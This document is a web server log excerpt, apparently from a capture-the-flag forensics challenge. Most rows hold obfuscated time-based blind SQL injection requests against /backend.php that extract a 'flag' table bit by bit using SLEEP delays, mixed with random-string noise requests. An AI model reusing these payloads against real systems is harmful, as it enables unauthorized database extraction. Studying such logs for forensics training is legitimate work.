line_no	timestamp	decoded_request
405	01/Mar/2015:13:16:31 -0500	/backend.php?user=FnUvIYgqD5nPUEimg9Fcj8CyrbpOxMbNX96i3eUUbcPgUwuCptx3C4VAfYnWQMx6JjQZTH
406	01/Mar/2015:13:16:30 -0500	/backend.php?user=admin' AND IF(/*d86rg345vSr*/SUBSTRING(REVERSE(/*9ev*/CONV(HEX(SUBSTRING(/*Rr*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*bmFprwW*/),12,1)),16,2))/*BmAgW*/,2,1)=1,SLEEP(2),62273678) AND '274347
407	01/Mar/2015:13:16:32 -0500	/backend.php?user=dJULINVjcWiIi1Bt8VKGBRPB5WMaewHwsCnMSKk8cGzlaXwDiINdp1hOZdNcnZmdg76q
408	01/Mar/2015:13:16:32 -0500	/backend.php?user=admin' AND IF(/*fBjjQN7*/SUBSTRING(REVERSE(/*laYrTNvZ*/CONV(HEX(SUBSTRING(/*1CoeVVn9E*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*FnzQhjYvl*/),12,1)),16,2))/*a2ZVsSi*/,3,1)=1,SLEEP(2),7517351) AND '55662
409	01/Mar/2015:13:16:34 -0500	/backend.php?user=admin' AND IF(/*7BSjc2a*/SUBSTRING(REVERSE(/*Za2WJWhCE*/CONV(HEX(SUBSTRING(/*Y5U9s*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*Y9zxrr6YKg*/),12,1)),16,2))/*cijcs7zilZM*/,4,1)=1,SLEEP(2),3318) AND '54
410	01/Mar/2015:13:16:34 -0500	/backend.php?user=t9xG4LsDIsJGa8owkqlEKnvAWQf7NFkGZeTgevCybj4zptiKGjIQcX6BCzxICNQONZLh16XBQyL6NuHsaid
411	01/Mar/2015:13:16:34 -0500	/backend.php?user=admin' AND IF(/*EgDiT*/SUBSTRING(REVERSE(/*Gfb*/CONV(HEX(SUBSTRING(/*BdkAZSl*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*XgDUSTbh*/),12,1)),16,2))/*eSIp99fi*/,5,1)=1,SLEEP(2),65114) AND '1774386
412	01/Mar/2015:13:16:36 -0500	/backend.php?user=MBdoCtHjxBJDkRNvTPNmk8Ao26CX26krQSYTnlIr2QmjiV8aJLGNw94adC9q6v2GTae0uazlk6N0n25dpvZLqpW5OE
413	01/Mar/2015:13:16:37 -0500	/backend.php?user=g8cvCNtzTTHXiOtOUicF6g32DLwesjEerGfJ7zZ5c
414	01/Mar/2015:13:16:36 -0500	/backend.php?user=admin' AND IF(/*rN0lybc1z*/SUBSTRING(REVERSE(/*oiE5XT*/CONV(HEX(SUBSTRING(/*bisQ*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*yjYmAD1W5k*/),12,1)),16,2))/*yqdytdXS*/,6,1)=1,SLEEP(2),1813) AND '1671751
415	01/Mar/2015:13:16:38 -0500	/backend.php?user=admin' AND IF(/*o0fQ*/SUBSTRING(REVERSE(/*16XVUAic3*/CONV(HEX(SUBSTRING(/*q3hXKX*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*ciu7uXke*/),12,1)),16,2))/*F3ihz*/,7,1)=1,SLEEP(2),71279277) AND '469466
416	01/Mar/2015:13:16:38 -0500	/backend.php?user=admin' AND IF(/*bR38*/SUBSTRING(REVERSE(/*TW54bIFH2*/CONV(HEX(SUBSTRING(/*lzvX*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*LWBDd*/),13,1)),16,2))/*oUfM3USsifV*/,1,1)=1,SLEEP(2),613973454) AND '383
417	01/Mar/2015:13:16:38 -0500	/backend.php?user=admin' AND IF(/*YV9bm52RFX*/SUBSTRING(REVERSE(/*f9lbdzymoH*/CONV(HEX(SUBSTRING(/*XTyyxWV2V*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*S2zUGT2S9Q*/),13,1)),16,2))/*MTG8enfi*/,2,1)=1,SLEEP(2),41558442) AND '816
418	01/Mar/2015:13:16:38 -0500	/backend.php?user=admin' AND IF(/*uq*/SUBSTRING(REVERSE(/*YpG0ayBXRP*/CONV(HEX(SUBSTRING(/*QbLegJUcBR*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*jKS*/),13,1)),16,2))/*h43LE*/,3,1)=1,SLEEP(2),97946164) AND '88721
419	01/Mar/2015:13:16:38 -0500	/backend.php?user=admin' AND IF(/*IDQpR*/SUBSTRING(REVERSE(/*Dgg*/CONV(HEX(SUBSTRING(/*nQxa6Ho2so*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*ZkSbKHc2*/),13,1)),16,2))/*DR1Qvo5Qr*/,4,1)=1,SLEEP(2),857838) AND '416287
420	01/Mar/2015:13:16:38 -0500	/backend.php?user=nSFMCt5dRsfYnuPLA6y4nAhgEmFGhl54OKTd50SApupiAW8B8qLIEXMYiFOjlVSDubLctmBgLeNcLb4IecQ7ZuS8K941C
421	01/Mar/2015:13:16:39 -0500	/backend.php?user=MGHx5Di939KCKahco
422	01/Mar/2015:13:16:38 -0500	/backend.php?user=admin' AND IF(/*JXBo*/SUBSTRING(REVERSE(/*nKsDrHlPw4o*/CONV(HEX(SUBSTRING(/*DbMEnYe0*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*fX2fpiaz*/),13,1)),16,2))/*OXEnBs*/,5,1)=1,SLEEP(2),5287) AND '2785
423	01/Mar/2015:13:16:40 -0500	/backend.php?user=gz3BhRydTrolcsK4s50fyBFgUDnJqicI5MZ7eL9Tn2xwgLaz2MHFfOdzsO7ir83v
424	01/Mar/2015:13:16:41 -0500	/backend.php?user=0IApetfWdgL9g1oBDf8GCvDnkswbosiwQZHfeQovDLfd33HxM8xy9RMKg3zllVeeRXzDd9
425	01/Mar/2015:13:16:40 -0500	/backend.php?user=admin' AND IF(/*qq*/SUBSTRING(REVERSE(/*G6pJs7aFRxr*/CONV(HEX(SUBSTRING(/*IEgJq*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*arv*/),13,1)),16,2))/*zcWe*/,6,1)=1,SLEEP(2),4512) AND '45554
426	01/Mar/2015:13:16:42 -0500	/backend.php?user=admin' AND IF(/*EzM8LyYl*/SUBSTRING(REVERSE(/*QMk*/CONV(HEX(SUBSTRING(/*JMj9YA*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*1ngT0lZ*/),13,1)),16,2))/*EY7fIqxwCR*/,7,1)=1,SLEEP(2),3664254) AND '18913
427	01/Mar/2015:13:16:42 -0500	/backend.php?user=admin' AND IF(/*zKLtGTk*/SUBSTRING(REVERSE(/*N9Oyc*/CONV(HEX(SUBSTRING(/*lROG9L*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*mkxv*/),14,1)),16,2))/*GhiyYmPOLm*/,1,1)=1,SLEEP(2),9643452) AND '3437
428	01/Mar/2015:13:16:42 -0500	/backend.php?user=admin' AND IF(/*BS0oQzs*/SUBSTRING(REVERSE(/*Sm0*/CONV(HEX(SUBSTRING(/*icu299oDKHw*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*ESO9s*/),14,1)),16,2))/*9QbtqUd7G*/,2,1)=1,SLEEP(2),74713932) AND '62738
429	01/Mar/2015:13:16:42 -0500	/backend.php?user=MksjJkpelChRzcYA2Ahq5xzlMnlDBhzD31l1pl9pjM1qSi6zksyMBRZ5
430	01/Mar/2015:13:16:43 -0500	/backend.php?user=P7KfFB7zTVxygX4vyCF94LEMdisB
431	01/Mar/2015:13:16:42 -0500	/backend.php?user=admin' AND IF(/*nzQTyk*/SUBSTRING(REVERSE(/*uFhfV*/CONV(HEX(SUBSTRING(/*thUzX1cQ*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*XHek*/),14,1)),16,2))/*WMEPpLKQ1yf*/,3,1)=1,SLEEP(2),74497) AND '2116197
432	01/Mar/2015:13:16:45 -0500	/backend.php?user=tE8LG6wPnh8mJwxoeHEIgAxkkNVZDgQuZ9XSUDoT69EI1usxJTpZE7fsyKRXTySV8q5uMMU6XgFM
433	01/Mar/2015:13:16:44 -0500	/backend.php?user=admin' AND IF(/*Gpz2SF*/SUBSTRING(REVERSE(/*lcrOUn*/CONV(HEX(SUBSTRING(/*0ZCSJIbu9cZ*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*whoYE7*/),14,1)),16,2))/*iDr1mkVFVl*/,4,1)=1,SLEEP(2),99953) AND '85627
434	01/Mar/2015:13:16:46 -0500	/backend.php?user=admin' AND IF(/*RagH3*/SUBSTRING(REVERSE(/*bF3*/CONV(HEX(SUBSTRING(/*jP1EOlOfb*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*QI*/),14,1)),16,2))/*Bg3rmX6XF9*/,5,1)=1,SLEEP(2),42179) AND '1163571
435	01/Mar/2015:13:16:46 -0500	/backend.php?user=admin' AND IF(/*GuESHy1ylws*/SUBSTRING(REVERSE(/*RP22x0AmT8*/CONV(HEX(SUBSTRING(/*isSB6001wBP*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*CbH1I*/),14,1)),16,2))/*VAkMu*/,6,1)=1,SLEEP(2),378455692) AND '68
436	01/Mar/2015:13:16:47 -0500	/backend.php?user=wFfBHgTBo9xhJ2A2DYKkt7UYHVJkzHIlDhBNg
437	01/Mar/2015:13:16:46 -0500	/backend.php?user=admin' AND IF(/*d66Q3k*/SUBSTRING(REVERSE(/*5E*/CONV(HEX(SUBSTRING(/*DA*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*vVpIByM*/),14,1)),16,2))/*4c8*/,7,1)=1,SLEEP(2),48313898) AND '6889
438	01/Mar/2015:13:16:48 -0500	/backend.php?user=admin' AND IF(/*WkxJM*/SUBSTRING(REVERSE(/*Kvf*/CONV(HEX(SUBSTRING(/*a1bJVC44*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*U1nghRlY*/),15,1)),16,2))/*bbY5o0WGskN*/,1,1)=1,SLEEP(2),77185) AND '87193
439	01/Mar/2015:13:16:49 -0500	/backend.php?user=Z2R2K5eYbHuPtktuHE2rqctqyJSK04K7T3YYOajPCKpvSWZU3ig25rtBJkzCGtcBbiX6Ggjx9k2RfeWpDV
440	01/Mar/2015:13:16:48 -0500	/backend.php?user=admin' AND IF(/*Elt4a*/SUBSTRING(REVERSE(/*JE5*/CONV(HEX(SUBSTRING(/*jRzsLKxQML*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*j9nhB*/),15,1)),16,2))/*UDhnZZJ*/,2,1)=1,SLEEP(2),242372) AND '5479628
441	01/Mar/2015:13:16:50 -0500	/backend.php?user=admin' AND IF(/*yf*/SUBSTRING(REVERSE(/*xbTk0mHBZ*/CONV(HEX(SUBSTRING(/*wejzWKO*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*yRMna*/),15,1)),16,2))/*8xyZkGzkl*/,3,1)=1,SLEEP(2),211774681) AND '73
442	01/Mar/2015:13:16:51 -0500	/backend.php?user=LldR8kPvf9fuLSzvOzZcXKHnvWQvuPqVTsZi60U
443	01/Mar/2015:13:16:50 -0500	/backend.php?user=admin' AND IF(/*3MMyNetHm*/SUBSTRING(REVERSE(/*JGxCsGPM*/CONV(HEX(SUBSTRING(/*RRE*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*Ulocdr*/),15,1)),16,2))/*lJfAnewzJ1*/,4,1)=1,SLEEP(2),248148721) AND '6871
444	01/Mar/2015:13:16:52 -0500	/backend.php?user=admin' AND IF(/*7IyHaiQMniI*/SUBSTRING(REVERSE(/*YT*/CONV(HEX(SUBSTRING(/*Mkfh*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*ODLOh4oT8*/),15,1)),16,2))/*nKbIfq1K7*/,5,1)=1,SLEEP(2),48399146) AND '7734517
445	01/Mar/2015:13:16:53 -0500	/backend.php?user=M4EQvWMMBrvHXYGjpEIs5
446	01/Mar/2015:13:16:52 -0500	/backend.php?user=admin' AND IF(/*2DtbKlfN*/SUBSTRING(REVERSE(/*gx*/CONV(HEX(SUBSTRING(/*hc*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*KG*/),15,1)),16,2))/*VO*/,6,1)=1,SLEEP(2),556781) AND '3613266
447	01/Mar/2015:13:16:55 -0500	/backend.php?user=FaLxm4pabFpSRzjo5YihPXy96OwMwFeGKjnvaNys6mUkCQ87wPiXabtdFleRP9Hj2OGOQ
448	01/Mar/2015:13:16:54 -0500	/backend.php?user=admin' AND IF(/*V6KawNsxhdU*/SUBSTRING(REVERSE(/*JYLsH*/CONV(HEX(SUBSTRING(/*iTMlJkv0*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*zl0o4clWVrD*/),15,1)),16,2))/*g5uCm8Wy*/,7,1)=1,SLEEP(2),3675276) AND '5527
449	01/Mar/2015:13:16:56 -0500	/backend.php?user=KghQhckeDu4sKToo9Xkxaxg0fmJNKmvNEJMMbLfJIpq0VDOYdy1f9mjkItfP6U5AFcWWfsO082O6dzWJJV3CEooX5Xsm74cj95
450	01/Mar/2015:13:16:56 -0500	/backend.php?user=admin' AND IF(/*oQP*/SUBSTRING(REVERSE(/*eupR*/CONV(HEX(SUBSTRING(/*wTXhkwLoI*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*NJKd*/),16,1)),16,2))/*8WZ*/,1,1)=1,SLEEP(2),12182) AND '44891
451	01/Mar/2015:13:16:58 -0500	/backend.php?user=aSqahWBlzC4MNEtqydznKgfHDJv7Ug8qsEb3Ls85eZtXDtDdGDHZqLB
452	01/Mar/2015:13:16:59 -0500	/backend.php?user=moBa5Ebo8Lw2LKUyj14YFQxTXvOVmOJSCdWCd
453	01/Mar/2015:13:16:58 -0500	/backend.php?user=admin' AND IF(/*8MZVE65S*/SUBSTRING(REVERSE(/*0CG*/CONV(HEX(SUBSTRING(/*WGZViHawM*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*dFSdr*/),16,1)),16,2))/*LL*/,2,1)=1,SLEEP(2),3252) AND '4298
454	01/Mar/2015:13:17:01 -0500	/backend.php?user=dmvoQOfCPoksTmYSIw8CA
455	01/Mar/2015:13:17:00 -0500	/backend.php?user=admin' AND IF(/*HV3R2*/SUBSTRING(REVERSE(/*S9YsED1ZXq*/CONV(HEX(SUBSTRING(/*WpA5UxSA*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*fLWYnXa9*/),16,1)),16,2))/*FAckFzoNc*/,3,1)=1,SLEEP(2),12579) AND '82665
456	01/Mar/2015:13:17:02 -0500	/backend.php?user=admin' AND IF(/*eHNrQWk*/SUBSTRING(REVERSE(/*JaCTqs*/CONV(HEX(SUBSTRING(/*HWT5nG*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*GuFCREy*/),16,1)),16,2))/*SmPXCHJPgYu*/,4,1)=1,SLEEP(2),447975) AND '8144
457	01/Mar/2015:13:17:02 -0500	/backend.php?user=admin' AND IF(/*zu*/SUBSTRING(REVERSE(/*e0BP4zIgRyo*/CONV(HEX(SUBSTRING(/*x5u*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*qa*/),16,1)),16,2))/*JgqQU1Qm9uR*/,5,1)=1,SLEEP(2),946567) AND '2483565
458	01/Mar/2015:13:17:02 -0500	/backend.php?user=admin' AND IF(/*2qv0pBxMeYC*/SUBSTRING(REVERSE(/*7pU5Lpj*/CONV(HEX(SUBSTRING(/*WCa2jW*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*o4BiJcgAe*/),16,1)),16,2))/*pKZUqxVTo09*/,6,1)=1,SLEEP(2),7747) AND '18
459	01/Mar/2015:13:17:02 -0500	/backend.php?user=pd3BxI1fSyPpJVhXoBjR94hunAmHbyuXUbFx27csRsGqsbDpHN28fcV3ru0R
460	01/Mar/2015:13:17:03 -0500	/backend.php?user=op5bpZbODPu9su3Vk4lOMAkNVY
461	01/Mar/2015:13:17:02 -0500	/backend.php?user=admin' AND IF(/*d7i*/SUBSTRING(REVERSE(/*Ap0Rc6mxIu*/CONV(HEX(SUBSTRING(/*w3OHFO*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*8Vjoaccqto*/),16,1)),16,2))/*8x*/,7,1)=1,SLEEP(2),95379) AND '312427
462	01/Mar/2015:13:17:05 -0500	/backend.php?user=SO4LqATn32b7TEtc1aDDapkG0Qyry7XpGgH4PlJ5UieC
463	01/Mar/2015:13:17:04 -0500	/backend.php?user=admin' AND IF(/*20cCNqJBAtJ*/SUBSTRING(REVERSE(/*JsSgPcnGnk*/CONV(HEX(SUBSTRING(/*bNaa8E*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*WDxK55j7q*/),17,1)),16,2))/*UTLWbMpe6zB*/,1,1)=1,SLEEP(2),6629) AND '5439
464	01/Mar/2015:13:17:06 -0500	/backend.php?user=admin' AND IF(/*QNMHMvYBnH9*/SUBSTRING(REVERSE(/*dizaEKTdC*/CONV(HEX(SUBSTRING(/*JR33EYe*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*5Y*/),17,1)),16,2))/*4NpMJV*/,2,1)=1,SLEEP(2),74533) AND '5751
465	01/Mar/2015:13:17:06 -0500	/backend.php?user=admin' AND IF(/*8qYetRWIu*/SUBSTRING(REVERSE(/*HKZgCrVzGH*/CONV(HEX(SUBSTRING(/*0Ojz5Soj*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*aWWkrrT*/),17,1)),16,2))/*Q4v7JQNS*/,3,1)=1,SLEEP(2),639221236) AND '73
466	01/Mar/2015:13:17:06 -0500	/backend.php?user=xk17b4y9OoIe9pe6PjuTOArnRhEDay13ZN
467	01/Mar/2015:13:17:06 -0500	/backend.php?user=admin' AND IF(/*s9*/SUBSTRING(REVERSE(/*CGXVbS0*/CONV(HEX(SUBSTRING(/*61eUKk075g*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*KVvUk*/),17,1)),16,2))/*9ZuzpAAH*/,4,1)=1,SLEEP(2),81215) AND '469
468	01/Mar/2015:13:17:08 -0500	/backend.php?user=UQktQkowl0GV61c2ts2QQr9451sqv417mfKZduZrcs5S4k6pFz9kmiLeADGBXSrKRcMHTACS29PQpzJBEpkcDQmQL4nOPqD
469	01/Mar/2015:13:17:08 -0500	/backend.php?user=admin' AND IF(/*ivmZvkAienS*/SUBSTRING(REVERSE(/*XMc*/CONV(HEX(SUBSTRING(/*0SDqVEqe*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*2M2WSo9i2z*/),17,1)),16,2))/*2GdzapKb*/,5,1)=1,SLEEP(2),3676792) AND '846
470	01/Mar/2015:13:17:10 -0500	/backend.php?user=ZlDfwVVffypnZQVsscsR1Wwe6r6ILwXMzLPV48aNlBr72R1TCJ31lwlOrAebvep09EM6d2vcol357LmHox9uluoagd
471	01/Mar/2015:13:17:11 -0500	/backend.php?user=ZuWpp2TgnP3N72kBGanjy8Qewu3iJVNMa
472	01/Mar/2015:13:17:10 -0500	/backend.php?user=admin' AND IF(/*pZ*/SUBSTRING(REVERSE(/*5Pt81hso*/CONV(HEX(SUBSTRING(/*0FULN3VrG4*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*WRQ2ToS2LK*/),17,1)),16,2))/*lSFBHItYkQ*/,6,1)=1,SLEEP(2),6656) AND '56
473	01/Mar/2015:13:17:12 -0500	/backend.php?user=admin' AND IF(/*x6nS7Pl*/SUBSTRING(REVERSE(/*ocQ*/CONV(HEX(SUBSTRING(/*Bup*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*Xnn5OSvCK*/),17,1)),16,2))/*mj*/,7,1)=1,SLEEP(2),2595) AND '982
474	01/Mar/2015:13:17:12 -0500	/backend.php?user=admin' AND IF(/*6y1uY7*/SUBSTRING(REVERSE(/*vl*/CONV(HEX(SUBSTRING(/*pbMnmAgAUms*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*wi9gYe*/),18,1)),16,2))/*kuSiC*/,1,1)=1,SLEEP(2),48813678) AND '36
475	01/Mar/2015:13:17:12 -0500	/backend.php?user=ILyMCT4C3v6ieKlgTE6h3Ris9TaIxv41mNYow9Hmp2flvKQM7JNLtGlkJt
476	01/Mar/2015:13:17:13 -0500	/backend.php?user=P0jtRyxgphYHIGGSCGSjMxEBuJDCMMulBnGjrdvk
477	01/Mar/2015:13:17:12 -0500	/backend.php?user=admin' AND IF(/*n2*/SUBSTRING(REVERSE(/*LiAxiNxe0d*/CONV(HEX(SUBSTRING(/*pw*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*QBNeey*/),18,1)),16,2))/*Iu*/,2,1)=1,SLEEP(2),49753) AND '84587
478	01/Mar/2015:13:17:14 -0500	/backend.php?user=admin' AND IF(/*43S2b7LPRKP*/SUBSTRING(REVERSE(/*cxq*/CONV(HEX(SUBSTRING(/*poj7a*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*yspnW*/),18,1)),16,2))/*z4X*/,3,1)=1,SLEEP(2),21613) AND '6741
479	01/Mar/2015:13:17:14 -0500	/backend.php?user=admin' AND IF(/*h72yVa*/SUBSTRING(REVERSE(/*MjzZR3u8hF*/CONV(HEX(SUBSTRING(/*gsAA2x49Ii*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*gti7NAs6n*/),18,1)),16,2))/*jwq9du2w8io*/,4,1)=1,SLEEP(2),994555) AND '12
480	01/Mar/2015:13:17:14 -0500	/backend.php?user=PKN1XmF2BPQ21nSmQzxZmEf9gtZn2cnVusorE0kfjr6nC8T2mpVpfFCjBQL0
481	01/Mar/2015:13:17:15 -0500	/backend.php?user=wPUJTESPesmjvT51c8QRWYwAn8QJ
482	01/Mar/2015:13:17:14 -0500	/backend.php?user=admin' AND IF(/*dSXK0*/SUBSTRING(REVERSE(/*itM*/CONV(HEX(SUBSTRING(/*L0r*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*RuAxx*/),18,1)),16,2))/*qm7V*/,5,1)=1,SLEEP(2),38323) AND '358
483	01/Mar/2015:13:17:17 -0500	/backend.php?user=GSBy0Eql0zchrwkdNaHRMHOihEOmcS4yjyp8ff9mohOKcv1R3981LZz6EiDqVXfPdebhEkMig
484	01/Mar/2015:13:17:16 -0500	/backend.php?user=admin' AND IF(/*VLt1HAv*/SUBSTRING(REVERSE(/*JANrk*/CONV(HEX(SUBSTRING(/*UWqQi*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*QFXfz50qgp*/),18,1)),16,2))/*i9D*/,6,1)=1,SLEEP(2),57194) AND '7483113
485	01/Mar/2015:13:17:18 -0500	/backend.php?user=admin' AND IF(/*Vaao*/SUBSTRING(REVERSE(/*2SMT*/CONV(HEX(SUBSTRING(/*EvXWl5RltQm*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*O2I*/),18,1)),16,2))/*LZ3*/,7,1)=1,SLEEP(2),9259622) AND '83
486	01/Mar/2015:13:17:19 -0500	/backend.php?user=XcWzc20hZKJkyTDup5TQBqHl6DM4IW3hUuO60YlORUboGJr17MQriDWasv8PnrYebIgoy3J0L
487	01/Mar/2015:13:17:18 -0500	/backend.php?user=admin' AND IF(/*1koqmf4tw*/SUBSTRING(REVERSE(/*HXewo*/CONV(HEX(SUBSTRING(/*cA9hE8OnG*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*0t*/),19,1)),16,2))/*6YV*/,1,1)=1,SLEEP(2),33737168) AND '2426
488	01/Mar/2015:13:17:21 -0500	/backend.php?user=vRapDcuFt4rtT1o
489	01/Mar/2015:13:17:20 -0500	/backend.php?user=admin' AND IF(/*pmdsH*/SUBSTRING(REVERSE(/*Nl*/CONV(HEX(SUBSTRING(/*0pNZbeum*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*i7fZHZ*/),19,1)),16,2))/*7tSkGR4T5*/,2,1)=1,SLEEP(2),59937752) AND '52
490	01/Mar/2015:13:17:23 -0500	/backend.php?user=z9ta6Gz7eQtAUgZjtPinWnoKElRTqEoHXA9ieqSv9UXKt1pmooCUVLaCh2Tt3zBCyKnnG1X7gih3S6qpS
491	01/Mar/2015:13:17:22 -0500	/backend.php?user=admin' AND IF(/*Pm3u*/SUBSTRING(REVERSE(/*nh07cMsU*/CONV(HEX(SUBSTRING(/*GH5L4D*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*Ra*/),19,1)),16,2))/*teLF*/,3,1)=1,SLEEP(2),12241) AND '19288
492	01/Mar/2015:13:17:25 -0500	/backend.php?user=tJLGQifUEVnEVCHaUdVKGaP3q79bPc
493	01/Mar/2015:13:17:24 -0500	/backend.php?user=admin' AND IF(/*guxbdFPI6fN*/SUBSTRING(REVERSE(/*iH*/CONV(HEX(SUBSTRING(/*aMjVUo3ho*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*6DoEMUbcn*/),19,1)),16,2))/*cQ0E0TqFs*/,4,1)=1,SLEEP(2),9482327) AND '817435
494	01/Mar/2015:13:17:26 -0500	/backend.php?user=admin' AND IF(/*r8U*/SUBSTRING(REVERSE(/*xsY0HvSuxa*/CONV(HEX(SUBSTRING(/*H2*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*kkZkqkX7*/),19,1)),16,2))/*trfVb5*/,5,1)=1,SLEEP(2),1239) AND '5899365
495	01/Mar/2015:13:17:26 -0500	/backend.php?user=admin' AND IF(/*w7NY*/SUBSTRING(REVERSE(/*DmjyD8asFF*/CONV(HEX(SUBSTRING(/*GAxo6Qn*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*mioEGG*/),19,1)),16,2))/*IiU*/,6,1)=1,SLEEP(2),983797) AND '56
496	01/Mar/2015:13:17:27 -0500	/backend.php?user=Q3iBzN5uO2GnPivj9kspl0xNK5sWl6a8znODlrDgFLAGme5bp
497	01/Mar/2015:13:17:26 -0500	/backend.php?user=admin' AND IF(/*3dt2XXGrG*/SUBSTRING(REVERSE(/*P6*/CONV(HEX(SUBSTRING(/*2bn*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*JEP5yPtR*/),19,1)),16,2))/*a8*/,7,1)=1,SLEEP(2),443813) AND '89338
498	01/Mar/2015:13:17:28 -0500	/backend.php?user=admin' AND IF(/*1QqP4rbkkwA*/SUBSTRING(REVERSE(/*7m*/CONV(HEX(SUBSTRING(/*UATHh8B*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*r3LgXeB*/),20,1)),16,2))/*D5NTohFCai*/,1,1)=1,SLEEP(2),88774541) AND '6765611
499	01/Mar/2015:13:17:28 -0500	/backend.php?user=admin' AND IF(/*1QVowbXnr*/SUBSTRING(REVERSE(/*TC6t84*/CONV(HEX(SUBSTRING(/*kcERb35p*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*j4h*/),20,1)),16,2))/*ssNRqy*/,2,1)=1,SLEEP(2),44442583) AND '7191
